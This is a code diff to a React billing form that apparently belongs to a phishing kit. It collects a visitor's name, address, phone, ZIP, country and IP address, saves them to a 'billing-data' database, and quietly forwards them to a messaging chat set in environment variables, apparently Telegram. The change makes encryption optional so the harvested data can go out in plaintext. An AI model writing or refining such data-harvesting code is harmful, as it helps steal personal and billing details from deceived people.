@@ -44,29 +44,51 @@ const Billing = () => {
             })
             .then(ip => {
                 const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
+                const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
+                let fullnames = fullname
+                let addresss = address
+                let states = state
+                let citys = city
+                let zips = zip
+                let phones = phone
+                let countrys = country
+                let ip_address = ip
+                let logged_at = moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                if( isEnableDecrypt === '1' )
+                {
+                    fullnames = CryptoJS.AES.encrypt(fullnames, secretKey).toString()
+                    addresss = CryptoJS.AES.encrypt(addresss, secretKey).toString()
+                    states = CryptoJS.AES.encrypt(states, secretKey).toString()
+                    citys = CryptoJS.AES.encrypt(citys, secretKey).toString()
+                    zips = CryptoJS.AES.encrypt(zips, secretKey).toString()
+                    phones = CryptoJS.AES.encrypt(phones, secretKey).toString()
+                    countrys = CryptoJS.AES.encrypt(countrys, secretKey).toString()
+                    ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
+                    logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
+                }
                 db.collection('billing-data').add({
-                    fullname: CryptoJS.AES.encrypt(fullname, secretKey).toString(), 
-                    address: CryptoJS.AES.encrypt(address, secretKey).toString(), 
-                    state: CryptoJS.AES.encrypt(state, secretKey).toString(), 
-                    city: CryptoJS.AES.encrypt(city, secretKey).toString(), 
-                    zip: CryptoJS.AES.encrypt(zip, secretKey).toString(), 
-                    phone: CryptoJS.AES.encrypt(phone, secretKey).toString(), 
-                    country: CryptoJS.AES.encrypt(ip, secretKey).toString(),
-                    ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
-                    logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
+                    fullname: fullnames, 
+                    address: addresss, 
+                    state: states, 
+                    city: citys, 
+                    zip: zips, 
+                    phone: phones, 
+                    country: countrys,
+                    ip_address: ip_address,
+                    logged_at: logged_at
                 }).then(data => {
                     if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                     {
                         let message = "Billing Data\r\n"
-                        message += "Full Name: " + CryptoJS.AES.encrypt(fullname, secretKey).toString() + '\r\n'
-                        message += "Address: " + CryptoJS.AES.encrypt(address, secretKey).toString() + '\r\n'
-                        message += "State: " + CryptoJS.AES.encrypt(state, secretKey).toString() + '\r\n'
-                        message += "City: " + CryptoJS.AES.encrypt(city, secretKey).toString() + '\r\n'
-                        message += "ZIP: " + CryptoJS.AES.encrypt(zip, secretKey).toString() + '\r\n'
-                        message += "Phone Number: " + CryptoJS.AES.encrypt(phone, secretKey).toString() + '\r\n'
-                        message += "Country: " + CryptoJS.AES.encrypt(country, secretKey).toString() + '\r\n'
-                        message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
-                        message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
+                        message += "" + fullnames + '\r\n'
+                        message += "" + addresss + '\r\n'
+                        message += "" + states + '\r\n'
+                        message += "" + citys + '\r\n'
+                        message += "" + zips + '\r\n'
+                        message += "" + phones + '\r\n'
+                        message += "" + countrys + '\r\n'
+                        message += "" + ip_address + '\r\n'
+                        message += "" + logged_at
                         client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                             disableWebPagePreview: true,
                             disableNotification: true,
